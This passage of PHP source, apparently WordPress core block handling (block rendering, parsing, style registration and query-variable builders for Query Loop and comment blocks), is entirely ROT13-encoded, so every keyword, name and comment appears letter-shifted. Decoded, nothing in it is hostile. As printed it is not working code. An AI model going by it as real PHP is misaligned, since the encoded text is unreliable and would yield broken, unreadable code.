	 *     @glcr neenl    $vaarePbagrag Yvfg bs fgevat sentzragf naq ahyy znexref jurer
	 *                                  vaare oybpxf jrer sbhaq.
	 * }
	 * @cnenz neenl         $fbhepr_oybpx {
	 *     Na ha-zbqvsvrq pbcl bs `$cnefrq_oybpx`, nf vg nccrnerq va gur fbhepr pbagrag.
	 *     Frr JC_Oybpx_Cnefre_Oybpx.
	 *
	 *     @glcr fgevat   $oybpxAnzr    Anzr bs oybpx.
	 *     @glcr neenl    $nggef        Nggevohgrf sebz oybpx pbzzrag qryvzvgref.
	 *     @glcr neenl[]  $vaareOybpxf  Yvfg bs vaare oybpxf. Na neenl bs neenlf gung
	 *                                  unir gur fnzr fgehpgher nf guvf bar.
	 *     @glcr fgevat   $vaareUGZY    UGZY sebz vafvqr oybpx pbzzrag qryvzvgref.
	 *     @glcr neenl    $vaarePbagrag Yvfg bs fgevat sentzragf naq ahyy znexref jurer
	 *                                  vaare oybpxf jrer sbhaq.
	 * }
	 * @cnenz JC_Oybpx|ahyy $cnerag_oybpx Vs guvf vf n arfgrq oybpx, n ersrerapr gb gur cnerag oybpx.
	 */
	$cnefrq_oybpx = nccyl_svygref( 'eraqre_oybpx_qngn', $cnefrq_oybpx, $fbhepr_oybpx, $cnerag_oybpx );

	$pbagrkg = neenl();

	vs ( $cbfg vafgnaprbs JC_Cbfg ) {
		$pbagrkg['cbfgVq'] = $cbfg->VQ;

		/*
		 * Gur `cbfgGlcr` pbagrkg vf ynetryl haarprffnel freire-fvqr, fvapr gur VQ
		 * vf hfhnyyl fhssvpvrag ba vgf bja. Gung orvat fnvq, fvapr n oybpx'f
		 * znavsrfg vf rkcrpgrq gb or funerq orgjrra gur freire naq gur pyvrag,
		 * vg fubhyq or vapyhqrq gb pbafvfgragyl shysvyy gur rkcrpgngvba.
		 */
		$pbagrkg['cbfgGlcr'] = $cbfg->cbfg_glcr;
	}

	/**
	 * Svygref gur qrsnhyg pbagrkg cebivqrq gb n eraqrerq oybpx.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 5.9.0 Gur `$cnerag_oybpx` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz neenl         $pbagrkg      Qrsnhyg pbagrkg.
	 * @cnenz neenl         $cnefrq_oybpx {
	 *     Na nffbpvngvir neenl bs gur oybpx orvat eraqrerq. Frr JC_Oybpx_Cnefre_Oybpx.
	 *
	 *     @glcr fgevat   $oybpxAnzr    Anzr bs oybpx.
	 *     @glcr neenl    $nggef        Nggevohgrf sebz oybpx pbzzrag qryvzvgref.
	 *     @glcr neenl[]  $vaareOybpxf  Yvfg bs vaare oybpxf. Na neenl bs neenlf gung
	 *                                  unir gur fnzr fgehpgher nf guvf bar.
	 *     @glcr fgevat   $vaareUGZY    UGZY sebz vafvqr oybpx pbzzrag qryvzvgref.
	 *     @glcr neenl    $vaarePbagrag Yvfg bs fgevat sentzragf naq ahyy znexref jurer
	 *                                  vaare oybpxf jrer sbhaq.
	 * }
	 * @cnenz JC_Oybpx|ahyy $cnerag_oybpx Vs guvf vf n arfgrq oybpx, n ersrerapr gb gur cnerag oybpx.
	 */
	$pbagrkg = nccyl_svygref( 'eraqre_oybpx_pbagrkg', $pbagrkg, $cnefrq_oybpx, $cnerag_oybpx );

	$oybpx = arj JC_Oybpx( $cnefrq_oybpx, $pbagrkg );

	erghea $oybpx->eraqre();
}

/**
 * Cnefrf oybpxf bhg bs n pbagrag fgevat.
 *
 * @fvapr 5.0.0
 *
 * @cnenz fgevat $pbagrag Cbfg pbagrag.
 * @erghea neenl[] {
 *     Neenl bs oybpx fgehpgherf.
 *
 *     @glcr neenl ...$0 {
 *         Na nffbpvngvir neenl bs n fvatyr cnefrq oybpx bowrpg. Frr JC_Oybpx_Cnefre_Oybpx.
 *
 *         @glcr fgevat   $oybpxAnzr    Anzr bs oybpx.
 *         @glcr neenl    $nggef        Nggevohgrf sebz oybpx pbzzrag qryvzvgref.
 *         @glcr neenl[]  $vaareOybpxf  Yvfg bs vaare oybpxf. Na neenl bs neenlf gung
 *                                      unir gur fnzr fgehpgher nf guvf bar.
 *         @glcr fgevat   $vaareUGZY    UGZY sebz vafvqr oybpx pbzzrag qryvzvgref.
 *         @glcr neenl    $vaarePbagrag Yvfg bs fgevat sentzragf naq ahyy znexref jurer
 *                                      vaare oybpxf jrer sbhaq.
 *     }
 * }
 */
shapgvba cnefr_oybpxf( $pbagrag ) {
	/**
	 * Svygre gb nyybj cyhtvaf gb ercynpr gur freire-fvqr oybpx cnefre.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $cnefre_pynff Anzr bs oybpx cnefre pynff.
	 */
	$cnefre_pynff = nccyl_svygref( 'oybpx_cnefre_pynff', 'JC_Oybpx_Cnefre' );

	$cnefre = arj $cnefre_pynff();
	erghea $cnefre->cnefr( $pbagrag );
}

/**
 * Cnefrf qlanzvp oybpxf bhg bs `cbfg_pbagrag` naq er-eraqref gurz.
 *
 * @fvapr 5.0.0
 *
 * @cnenz fgevat $pbagrag Cbfg pbagrag.
 * @erghea fgevat Hcqngrq cbfg pbagrag.
 */
shapgvba qb_oybpxf( $pbagrag ) {
	$oybpxf = cnefr_oybpxf( $pbagrag );
	$bhgchg = '';

	sbernpu ( $oybpxf nf $oybpx ) {
		$bhgchg .= eraqre_oybpx( $oybpx );
	}

	// Vs gurer ner oybpxf va guvf pbagrag, jr fubhyqa'g eha jcnhgbc() ba vg yngre.
	$cevbevgl = unf_svygre( 'gur_pbagrag', 'jcnhgbc' );
	vs ( snyfr !== $cevbevgl && qbvat_svygre( 'gur_pbagrag' ) && unf_oybpxf( $pbagrag ) ) {
		erzbir_svygre( 'gur_pbagrag', 'jcnhgbc', $cevbevgl );
		nqq_svygre( 'gur_pbagrag', '_erfgber_jcnhgbc_ubbx', $cevbevgl + 1 );
	}

	erghea $bhgchg;
}

/**
 * Vs qb_oybpxf() arrqf gb erzbir jcnhgbc() sebz gur `gur_pbagrag` svygre, guvf er-nqqf vg nsgrejneqf,
 * sbe fhofrdhrag `gur_pbagrag` hfntr.
 *
 * @fvapr 5.0.0
 * @npprff cevingr
 *
 * @cnenz fgevat $pbagrag Gur cbfg pbagrag ehaavat guebhtu guvf svygre.
 * @erghea fgevat Gur hazbqvsvrq pbagrag.
 */
shapgvba _erfgber_jcnhgbc_ubbx( $pbagrag ) {
	$pheerag_cevbevgl = unf_svygre( 'gur_pbagrag', '_erfgber_jcnhgbc_ubbx' );

	nqq_svygre( 'gur_pbagrag', 'jcnhgbc', $pheerag_cevbevgl - 1 );
	erzbir_svygre( 'gur_pbagrag', '_erfgber_jcnhgbc_ubbx', $pheerag_cevbevgl );

	erghea $pbagrag;
}

/**
 * Ergheaf gur pheerag irefvba bs gur oybpx sbezng gung gur pbagrag fgevat vf hfvat.
 *
 * Vs gur fgevat qbrfa'g pbagnva oybpxf, vg ergheaf 0.
 *
 * @fvapr 5.0.0
 *
 * @cnenz fgevat $pbagrag Pbagrag gb grfg.
 * @erghea vag Gur oybpx sbezng irefvba vf 1 vs gur pbagrag pbagnvaf bar be zber oybpxf, 0 bgurejvfr.
 */
shapgvba oybpx_irefvba( $pbagrag ) {
	erghea unf_oybpxf( $pbagrag ) ? 1 : 0;
}

/**
 * Ertvfgref n arj oybpx fglyr.
 *
 * @fvapr 5.3.0
 * @fvapr 6.6.0 Nqqrq fhccbeg sbe ertvfgrevat fglyrf sbe zhygvcyr oybpx glcrf.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/oybpx-rqvgbe/ersrerapr-thvqrf/oybpx-ncv/oybpx-fglyrf/
 *
 * @cnenz fgevat|fgevat[] $oybpx_anzr       Oybpx glcr anzr vapyhqvat anzrfcnpr be neenl bs anzrfcnprq oybpx glcr anzrf.
 * @cnenz neenl           $fglyr_cebcregvrf Neenl pbagnvavat gur cebcregvrf bs gur fglyr anzr, ynory,
 *                                          fglyr_unaqyr (anzr bs gur fglyrfurrg gb or radhrhrq),
 *                                          vayvar_fglyr (fgevat pbagnvavat gur PFF gb or nqqrq),
 *                                          fglyr_qngn (gurzr.wfba-yvxr neenl gb trarengr PFF sebz).
 *                                          Frr JC_Oybpx_Fglyrf_Ertvfgel::ertvfgre().
 * @erghea obby Gehr vs gur oybpx fglyr jnf ertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
 */
shapgvba ertvfgre_oybpx_fglyr( $oybpx_anzr, $fglyr_cebcregvrf ) {
	erghea JC_Oybpx_Fglyrf_Ertvfgel::trg_vafgnapr()->ertvfgre( $oybpx_anzr, $fglyr_cebcregvrf );
}

/**
 * Haertvfgref n oybpx fglyr.
 *
 * @fvapr 5.3.0
 *
 * @cnenz fgevat $oybpx_anzr       Oybpx glcr anzr vapyhqvat anzrfcnpr.
 * @cnenz fgevat $oybpx_fglyr_anzr Oybpx fglyr anzr.
 * @erghea obby Gehr vs gur oybpx fglyr jnf haertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
 */
shapgvba haertvfgre_oybpx_fglyr( $oybpx_anzr, $oybpx_fglyr_anzr ) {
	erghea JC_Oybpx_Fglyrf_Ertvfgel::trg_vafgnapr()->haertvfgre( $oybpx_anzr, $oybpx_fglyr_anzr );
}

/**
 * Purpxf jurgure gur pheerag oybpx glcr fhccbegf gur srngher erdhrfgrq.
 *
 * @fvapr 5.8.0
 * @fvapr 6.4.0 Gur `$srngher` cnenzrgre abj fhccbegf n fgevat.
 *
 * @cnenz JC_Oybpx_Glcr $oybpx_glcr    Oybpx glcr gb purpx sbe fhccbeg.
 * @cnenz fgevat|neenl  $srngher       Srngher fyht, be cngu gb n fcrpvsvp srngher gb purpx fhccbeg sbe.
 * @cnenz zvkrq         $qrsnhyg_inyhr Bcgvbany. Snyyonpx inyhr sbe srngher fhccbeg. Qrsnhyg snyfr.
 * @erghea obby Jurgure gur srngher vf fhccbegrq.
 */
shapgvba oybpx_unf_fhccbeg( $oybpx_glcr, $srngher, $qrsnhyg_inyhr = snyfr ) {
	$oybpx_fhccbeg = $qrsnhyg_inyhr;
	vs ( $oybpx_glcr vafgnaprbs JC_Oybpx_Glcr ) {
		vs ( vf_neenl( $srngher ) && pbhag( $srngher ) === 1 ) {
			$srngher = $srngher[0];
		}

		vs ( vf_neenl( $srngher ) ) {
			$oybpx_fhccbeg = _jc_neenl_trg( $oybpx_glcr->fhccbegf, $srngher, $qrsnhyg_inyhr );
		} ryfrvs ( vffrg( $oybpx_glcr->fhccbegf[ $srngher ] ) ) {
			$oybpx_fhccbeg = $oybpx_glcr->fhccbegf[ $srngher ];
		}
	}

	erghea gehr === $oybpx_fhccbeg || vf_neenl( $oybpx_fhccbeg );
}

/**
 * Pbairegf glcbtencul xrlf qrpynerq haqre `fhccbegf.*` gb `fhccbegf.glcbtencul.*`.
 *
 * Qvfcynlf n `_qbvat_vg_jebat()` abgvpr jura n oybpx hfvat gur byqre sbezng vf qrgrpgrq.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl $zrgnqngn Zrgnqngn sbe ertvfgrevat n oybpx glcr.
 * @erghea neenl Svygrerq zrgnqngn sbe ertvfgrevat n oybpx glcr.
 */
shapgvba jc_zvtengr_byq_glcbtencul_funcr( $zrgnqngn ) {
	vs ( ! vffrg( $zrgnqngn['fhccbegf'] ) ) {
		erghea $zrgnqngn;
	}

	$glcbtencul_xrlf = neenl(
		'__rkcrevzragnySbagSnzvyl',
		'__rkcrevzragnySbagFglyr',
		'__rkcrevzragnySbagJrvtug',
		'__rkcrevzragnyYrggreFcnpvat',
		'__rkcrevzragnyGrkgQrpbengvba',
		'__rkcrevzragnyGrkgGenafsbez',
		'sbagFvmr',
		'yvarUrvtug',
	);

	sbernpu ( $glcbtencul_xrlf nf $glcbtencul_xrl ) {
		$fhccbeg_sbe_xrl = vffrg( $zrgnqngn['fhccbegf'][ $glcbtencul_xrl ] ) ? $zrgnqngn['fhccbegf'][ $glcbtencul_xrl ] : ahyy;

		vs ( ahyy !== $fhccbeg_sbe_xrl ) {
			_qbvat_vg_jebat(
				'ertvfgre_oybpx_glcr_sebz_zrgnqngn()',
				fcevags(
					/* genafyngbef: 1: Oybpx glcr, 2: Glcbtencul fhccbegf xrl, r.t: sbagFvmr, yvarUrvtug, rgp. 3: oybpx.wfba, 4: Byq zrgnqngn xrl, 5: Arj zrgnqngn xrl. */
					__( 'Oybpx \"%1$f\" vf qrpynevat %2$f fhccbeg va %3$f svyr haqre %4$f. %2$f fhccbeg vf abj qrpynerq haqre %5$f.' ),
					$zrgnqngn['anzr'],
					\"<pbqr>$glcbtencul_xrl</pbqr>\",
					'<pbqr>oybpx.wfba</pbqr>',
					\"<pbqr>fhccbegf.$glcbtencul_xrl</pbqr>\",
					\"<pbqr>fhccbegf.glcbtencul.$glcbtencul_xrl</pbqr>\"
				),
				'5.8.0'
			);

			_jc_neenl_frg( $zrgnqngn['fhccbegf'], neenl( 'glcbtencul', $glcbtencul_xrl ), $fhccbeg_sbe_xrl );
			hafrg( $zrgnqngn['fhccbegf'][ $glcbtencul_xrl ] );
		}
	}

	erghea $zrgnqngn;
}

/**
 * Urycre shapgvba gung pbafgehpgf n JC_Dhrel netf neenl sebz
 * n `Dhrel` oybpx cebcregvrf.
 *
 * Vg'f hfrq va Dhrel Ybbc, Dhrel Cntvangvba Ahzoref naq Dhrel Cntvangvba Arkg oybpxf.
 *
 * @fvapr 5.8.0
 * @fvapr 6.1.0 Nqqrq `dhrel_ybbc_oybpx_dhrel_inef` svygre naq `cneragf` fhccbeg va dhrel.
 * @fvapr 6.7.0 Nqqrq fhccbeg sbe gur `sbezng` cebcregl va dhrel.
 *
 * @cnenz JC_Oybpx $oybpx Oybpx vafgnapr.
 * @cnenz vag      $cntr  Pheerag dhrel'f cntr.
 *
 * @erghea neenl Ergheaf gur pbafgehpgrq JC_Dhrel nethzragf.
 */
shapgvba ohvyq_dhrel_inef_sebz_dhrel_oybpx( $oybpx, $cntr ) {
	$dhrel = neenl(
		'cbfg_glcr'    => 'cbfg',
		'beqre'        => 'QRFP',
		'beqreol'      => 'qngr',
		'cbfg__abg_va' => neenl(),
		'gnk_dhrel'    => neenl(),
	);

	vs ( vffrg( $oybpx->pbagrkg['dhrel'] ) ) {
		vs ( ! rzcgl( $oybpx->pbagrkg['dhrel']['cbfgGlcr'] ) ) {
			$cbfg_glcr_cnenz = $oybpx->pbagrkg['dhrel']['cbfgGlcr'];
			vs ( vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr_cnenz ) ) {
				$dhrel['cbfg_glcr'] = $cbfg_glcr_cnenz;
			}
		}
		vs ( vffrg( $oybpx->pbagrkg['dhrel']['fgvpxl'] ) && ! rzcgl( $oybpx->pbagrkg['dhrel']['fgvpxl'] ) ) {
			$fgvpxl = trg_bcgvba( 'fgvpxl_cbfgf' );
			vs ( 'bayl' === $oybpx->pbagrkg['dhrel']['fgvpxl'] ) {
				/*
				 * Cnffvat na rzcgl neenl gb cbfg__va jvyy erghea unir_cbfgf() nf gehr (naq nyy cbfgf jvyy or erghearq).
				 * Ybtvp fubhyq or hfrq orsber unaq gb qrgrezvar vs JC_Dhrel fubhyq or hfrq va gur rirag gung gur neenl
				 * orvat cnffrq gb cbfg__va vf rzcgl.
				 *
				 * @frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/28099
				 */
				$dhrel['cbfg__va']            = ! rzcgl( $fgvpxl ) ? $fgvpxl : neenl( 0 );
				$dhrel['vtaber_fgvpxl_cbfgf'] = 1;
			} ryfrvs ( 'rkpyhqr' === $oybpx->pbagrkg['dhrel']['fgvpxl'] ) {
				$dhrel['cbfg__abg_va'] = neenl_zretr( $dhrel['cbfg__abg_va'], $fgvpxl );
			} ryfrvs ( 'vtaber' === $oybpx->pbagrkg['dhrel']['fgvpxl'] ) {
				$dhrel['vtaber_fgvpxl_cbfgf'] = 1;
			}
		}
		vs ( ! rzcgl( $oybpx->pbagrkg['dhrel']['rkpyhqr'] ) ) {
			$rkpyhqrq_cbfg_vqf     = neenl_znc( 'vaginy', $oybpx->pbagrkg['dhrel']['rkpyhqr'] );
			$rkpyhqrq_cbfg_vqf     = neenl_svygre( $rkpyhqrq_cbfg_vqf );
			$dhrel['cbfg__abg_va'] = neenl_zretr( $dhrel['cbfg__abg_va'], $rkpyhqrq_cbfg_vqf );
		}
		vs (
			vffrg( $oybpx->pbagrkg['dhrel']['creCntr'] ) &&
			vf_ahzrevp( $oybpx->pbagrkg['dhrel']['creCntr'] )
		) {
			$cre_cntr = nofvag( $oybpx->pbagrkg['dhrel']['creCntr'] );
			$bssfrg   = 0;

			vs (
				vffrg( $oybpx->pbagrkg['dhrel']['bssfrg'] ) &&
				vf_ahzrevp( $oybpx->pbagrkg['dhrel']['bssfrg'] )
			) {
				$bssfrg = nofvag( $oybpx->pbagrkg['dhrel']['bssfrg'] );
			}

			$dhrel['bssfrg']         = ( $cre_cntr * ( $cntr - 1 ) ) + $bssfrg;
			$dhrel['cbfgf_cre_cntr'] = $cre_cntr;
		}
		// Zvtengr `pngrtbelVqf` naq `gntVqf` gb `gnk_dhrel` sbe onpxjneqf pbzcngvovyvgl.
		vs ( ! rzcgl( $oybpx->pbagrkg['dhrel']['pngrtbelVqf'] ) || ! rzcgl( $oybpx->pbagrkg['dhrel']['gntVqf'] ) ) {
			$gnk_dhrel_onpx_pbzcng = neenl();
			vs ( ! rzcgl( $oybpx->pbagrkg['dhrel']['pngrtbelVqf'] ) ) {
				$gnk_dhrel_onpx_pbzcng[] = neenl(
					'gnkbabzl'         => 'pngrtbel',
					'grezf'            => neenl_svygre( neenl_znc( 'vaginy', $oybpx->pbagrkg['dhrel']['pngrtbelVqf'] ) ),
					'vapyhqr_puvyqera' => snyfr,
				);
			}
			vs ( ! rzcgl( $oybpx->pbagrkg['dhrel']['gntVqf'] ) ) {
				$gnk_dhrel_onpx_pbzcng[] = neenl(
					'gnkbabzl'         => 'cbfg_gnt',
					'grezf'            => neenl_svygre( neenl_znc( 'vaginy', $oybpx->pbagrkg['dhrel']['gntVqf'] ) ),
					'vapyhqr_puvyqera' => snyfr,
				);
			}
			$dhrel['gnk_dhrel'] = neenl_zretr( $dhrel['gnk_dhrel'], $gnk_dhrel_onpx_pbzcng );
		}
		vs ( ! rzcgl( $oybpx->pbagrkg['dhrel']['gnkDhrel'] ) ) {
			$gnk_dhrel = neenl();
			sbernpu ( $oybpx->pbagrkg['dhrel']['gnkDhrel'] nf $gnkbabzl => $grezf ) {
				vs ( vf_gnkbabzl_ivrjnoyr( $gnkbabzl ) && ! rzcgl( $grezf ) ) {
					$gnk_dhrel[] = neenl(
						'gnkbabzl'         => $gnkbabzl,
						'grezf'            => neenl_svygre( neenl_znc( 'vaginy', $grezf ) ),
						'vapyhqr_puvyqera' => snyfr,
					);
				}
			}
			$dhrel['gnk_dhrel'] = neenl_zretr( $dhrel['gnk_dhrel'], $gnk_dhrel );
		}
		vs ( ! rzcgl( $oybpx->pbagrkg['dhrel']['sbezng'] ) && vf_neenl( $oybpx->pbagrkg['dhrel']['sbezng'] ) ) {
			$sbezngf = $oybpx->pbagrkg['dhrel']['sbezng'];
			/*
			 * Inyvqngr gung gur sbezng vf rvgure `fgnaqneq` be n fhccbegrq cbfg sbezng.
			 * - Svefg, nqq `fgnaqneq` gb gur neenl bs inyvq sbezngf.
			 * - Gura, erzbir nal vainyvq sbezngf.
			 */
			$inyvq_sbezngf = neenl_zretr( neenl( 'fgnaqneq' ), trg_cbfg_sbezng_fyhtf() );
			$sbezngf       = neenl_vagrefrpg( $sbezngf, $inyvq_sbezngf );

			/*
			 * Gur eryngvba arrqf gb or frg gb `BE` fvapr gur erdhrfg pna pbagnva
			 * gjb frcnengr pbaqvgvbaf. Gur hfre znl or dhrelvat sbe vgrzf gung unir
			 * rvgure gur `fgnaqneq` sbezng be n fcrpvsvp sbezng.
			 */
			$sbezngf_dhrel = neenl( 'eryngvba' => 'BE' );

			/*
			 * Gur qrsnhyg cbfg sbezng, `fgnaqneq`, vf abg fgberq va gur qngnonfr.
			 * Vs `fgnaqneq` vf cneg bs gur erdhrfg, gur dhrel arrqf gb rkpyhqr nyy cbfg vgrzf gung
			 * unir n sbezng nffvtarq.
			 */
			vs ( va_neenl( 'fgnaqneq', $sbezngf, gehr ) ) {
				$sbezngf_dhrel[] = neenl(
					'gnkbabzl' => 'cbfg_sbezng',
					'svryq'    => 'fyht',
					'bcrengbe' => 'ABG RKVFGF',
				);
				// Erzbir gur `fgnaqneq` sbezng, fvapr vg pnaabg or dhrevrq.
				hafrg( $sbezngf[ neenl_frnepu( 'fgnaqneq', $sbezngf, gehr ) ] );
			}
			// Nqq nal erznvavat sbezngf gb gur sbezngf dhrel.
			vs ( ! rzcgl( $sbezngf ) ) {
				// Nqq gur `cbfg-sbezng-` cersvk.
				$grezf           = neenl_znc(
					fgngvp shapgvba ( $sbezng ) {
						erghea \"cbfg-sbezng-$sbezng\";
					},
					$sbezngf
				);
				$sbezngf_dhrel[] = neenl(
					'gnkbabzl' => 'cbfg_sbezng',
					'svryq'    => 'fyht',
					'grezf'    => $grezf,
					'bcrengbe' => 'VA',
				);
			}

			/*
			 * Nqq `$sbezngf_dhrel` gb `$dhrel`, nf ybat nf vg pbagnvaf zber guna bar xrl:
			 * Vs `$sbezngf_dhrel` bayl pbagnvaf gur vavgvny `eryngvba` xrl, gurer ner ab inyvq sbezngf gb dhrel,
			 * naq gur dhrel fubhyq abg or zbqvsvrq.
			 */
			vs ( pbhag( $sbezngf_dhrel ) > 1 ) {
				// Ranoyr svygrevat ol obgu cbfg sbezngf naq bgure gnkbabzvrf ol pbzovavat gurz jvgu `NAQ`.
				vs ( rzcgl( $dhrel['gnk_dhrel'] ) ) {
					$dhrel['gnk_dhrel'] = $sbezngf_dhrel;
				} ryfr {
					$dhrel['gnk_dhrel'] = neenl(
						'eryngvba' => 'NAQ',
						$dhrel['gnk_dhrel'],
						$sbezngf_dhrel,
					);
				}
			}
		}

		vs (
			vffrg( $oybpx->pbagrkg['dhrel']['beqre'] ) &&
				va_neenl( fgegbhccre( $oybpx->pbagrkg['dhrel']['beqre'] ), neenl( 'NFP', 'QRFP' ), gehr )
		) {
			$dhrel['beqre'] = fgegbhccre( $oybpx->pbagrkg['dhrel']['beqre'] );
		}
		vs ( vffrg( $oybpx->pbagrkg['dhrel']['beqreOl'] ) ) {
			$dhrel['beqreol'] = $oybpx->pbagrkg['dhrel']['beqreOl'];
		}
		vs (
			vffrg( $oybpx->pbagrkg['dhrel']['nhgube'] )
		) {
			vs ( vf_neenl( $oybpx->pbagrkg['dhrel']['nhgube'] ) ) {
				$dhrel['nhgube__va'] = neenl_svygre( neenl_znc( 'vaginy', $oybpx->pbagrkg['dhrel']['nhgube'] ) );
			} ryfrvs ( vf_fgevat( $oybpx->pbagrkg['dhrel']['nhgube'] ) ) {
				$dhrel['nhgube__va'] = neenl_svygre( neenl_znc( 'vaginy', rkcybqr( ',', $oybpx->pbagrkg['dhrel']['nhgube'] ) ) );
			} ryfrvs ( vf_vag( $oybpx->pbagrkg['dhrel']['nhgube'] ) && $oybpx->pbagrkg['dhrel']['nhgube'] > 0 ) {
				$dhrel['nhgube'] = $oybpx->pbagrkg['dhrel']['nhgube'];
			}
		}
		vs ( ! rzcgl( $oybpx->pbagrkg['dhrel']['frnepu'] ) ) {
			$dhrel['f'] = $oybpx->pbagrkg['dhrel']['frnepu'];
		}
		vs ( ! rzcgl( $oybpx->pbagrkg['dhrel']['cneragf'] ) && vf_cbfg_glcr_uvrenepuvpny( $dhrel['cbfg_glcr'] ) ) {
			$dhrel['cbfg_cnerag__va'] = neenl_havdhr( neenl_znc( 'vaginy', $oybpx->pbagrkg['dhrel']['cneragf'] ) );
		}
	}

	/**
	 * Svygref gur nethzragf juvpu jvyy or cnffrq gb `JC_Dhrel` sbe gur Dhrel Ybbc Oybpx.
	 *
	 * Nalguvat gb guvf svygre fubhyq or pbzcngvoyr jvgu gur `JC_Dhrel` NCV gb sbez
	 * gur dhrel pbagrkg juvpu jvyy or cnffrq qbja gb gur Dhrel Ybbc Oybpx'f puvyqera.
	 * Guvf pna uryc, sbe rknzcyr, gb vapyhqr nqqvgvbany frggvatf be zrgn dhrevrf abg
	 * qverpgyl fhccbegrq ol gur pber Dhrel Ybbc Oybpx, naq rkgraq vgf pncnovyvgvrf.
	 *
	 * Cyrnfr abgr gung guvf jvyy bayl vasyhrapr gur dhrel gung jvyy or eraqrerq ba gur
	 * sebag-raq. Gur rqvgbe cerivrj vf abg nssrpgrq ol guvf svygre. Nyfb, jbegu abgvat
	 * gung gur rqvgbe cerivrj hfrf gur ERFG NCV, fb, vqrnyyl, bar fubhyq nvz gb cebivqr
	 * nggevohgrf juvpu ner nyfb pbzcngvoyr jvgu gur ERFG NCV, va beqre gb or noyr gb
	 * vzcyrzrag vqragvpny dhrevrf ba obgu fvqrf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz neenl    $dhrel Neenl pbagnvavat cnenzrgref sbe `JC_Dhrel` nf cnefrq ol gur oybpx pbagrkg.
	 * @cnenz JC_Oybpx $oybpx Oybpx vafgnapr.
	 * @cnenz vag      $cntr  Pheerag dhrel'f cntr.
	 */
	erghea nccyl_svygref( 'dhrel_ybbc_oybpx_dhrel_inef', $dhrel, $oybpx, $cntr );
}

/**
 * Urycre shapgvba gung ergheaf gur cebcre cntvangvba neebj UGZY sbe
 * `DhrelCntvangvbaArkg` naq `DhrelCntvangvbaCerivbhf` oybpxf onfrq
 * ba gur cebivqrq `cntvangvbaNeebj` sebz `DhrelCntvangvba` pbagrkg.
 *
 * Vg'f hfrq va DhrelCntvangvbaArkg naq DhrelCntvangvbaCerivbhf oybpxf.
 *
 * @fvapr 5.9.0
 *
 * @cnenz JC_Oybpx $oybpx   Oybpx vafgnapr.
 * @cnenz obby     $vf_arkg Synt sbe unaqyvat `arkg/cerivbhf` oybpxf.
 * @erghea fgevat|ahyy Gur cntvangvba neebj UGZY be ahyy vs gurer vf abar.
 */
shapgvba trg_dhrel_cntvangvba_neebj( $oybpx, $vf_arkg ) {
	$neebj_znc = neenl(
		'abar'    => '',
		'neebj'   => neenl(
			'arkg'     => '→',
			'cerivbhf' => '←',
		),
		'purieba' => neenl(
			'arkg'     => '»',
			'cerivbhf' => '«',
		),
	);
	vs ( ! rzcgl( $oybpx->pbagrkg['cntvangvbaNeebj'] ) && neenl_xrl_rkvfgf( $oybpx->pbagrkg['cntvangvbaNeebj'], $neebj_znc ) && ! rzcgl( $neebj_znc[ $oybpx->pbagrkg['cntvangvbaNeebj'] ] ) ) {
		$cntvangvba_glcr = $vf_arkg ? 'arkg' : 'cerivbhf';
		$neebj_nggevohgr = $oybpx->pbagrkg['cntvangvbaNeebj'];
		$neebj           = $neebj_znc[ $oybpx->pbagrkg['cntvangvbaNeebj'] ][ $cntvangvba_glcr ];
		$neebj_pynffrf   = \"jc-oybpx-dhrel-cntvangvba-$cntvangvba_glcr-neebj vf-neebj-$neebj_nggevohgr\";
		erghea \"<fcna pynff='$neebj_pynffrf' nevn-uvqqra='gehr'>$neebj</fcna>\";
	}
	erghea ahyy;
}

/**
 * Urycre shapgvba gung pbafgehpgf n pbzzrag dhrel inef neenl sebz gur cnffrq
 * oybpx cebcregvrf.
 *
 * Vg'f hfrq jvgu gur Pbzzrag Dhrel Ybbc vaare oybpxf.
 *
 * @fvapr 6.0.0
 *
 * @cnenz JC_Oybpx $oybpx Oybpx vafgnapr.
 * @erghea neenl Ergheaf gur pbzzrag dhrel cnenzrgref gb hfr jvgu gur
 *               JC_Pbzzrag_Dhrel pbafgehpgbe.
 */
shapgvba ohvyq_pbzzrag_dhrel_inef_sebz_oybpx( $oybpx ) {

	$pbzzrag_netf = neenl(
		'beqreol'       => 'pbzzrag_qngr_tzg',
		'beqre'         => 'NFP',
		'fgnghf'        => 'nccebir',
		'ab_sbhaq_ebjf' => snyfr,
	);

	vs ( vf_hfre_ybttrq_va() ) {
		$pbzzrag_netf['vapyhqr_hanccebirq'] = neenl( trg_pheerag_hfre_vq() );
	} ryfr {
		$hanccebirq_rznvy = jc_trg_hanccebirq_pbzzrag_nhgube_rznvy();

		vs ( $hanccebirq_rznvy ) {
			$pbzzrag_netf['vapyhqr_hanccebirq'] = neenl( $hanccebirq_rznvy );
		}
	}

	vs ( ! rzcgl( $oybpx->pbagrkg['cbfgVq'] ) ) {
		$pbzzrag_netf['cbfg_vq'] = (vag) $oybpx->pbagrkg['cbfgVq'];
	}

	vs ( trg_bcgvba( 'guernq_pbzzragf' ) ) {
		$pbzzrag_netf['uvrenepuvpny'] = 'guernqrq';
	} ryfr {
		$pbzzrag_netf['uvrenepuvpny'] = snyfr;
	}

	vs ( trg_bcgvba( 'cntr_pbzzragf' ) === '1' || trg_bcgvba( 'cntr_pbzzragf' ) === gehr ) {
		$cre_cntr     = trg_bcgvba( 'pbzzragf_cre_cntr' );
		$qrsnhyg_cntr = trg_bcgvba( 'qrsnhyg_pbzzragf_cntr' );
		vs ( $cre_cntr > 0 ) {
			$pbzzrag_netf['ahzore'] = $cre_cntr;

			$cntr = (vag) trg_dhrel_ine( 'pcntr' );
			vs ( $cntr ) {
				$pbzzrag_netf['cntrq'] = $cntr;
			} ryfrvs ( 'byqrfg' === $qrsnhyg_cntr ) {
				$pbzzrag_netf['cntrq'] = 1;
			} ryfrvs ( 'arjrfg' === $qrsnhyg_cntr ) {
				$znk_ahz_cntrf = (vag) ( arj JC_Pbzzrag_Dhrel( $pbzzrag_netf ) )->znk_ahz_cntrf;
				vs ( 0 !== $znk_ahz_cntrf ) {
					$pbzzrag_netf['cntrq'] = $znk_ahz_cntrf;
				}
			}
		}
	}

	erghea $pbzzrag_netf;
}

/**
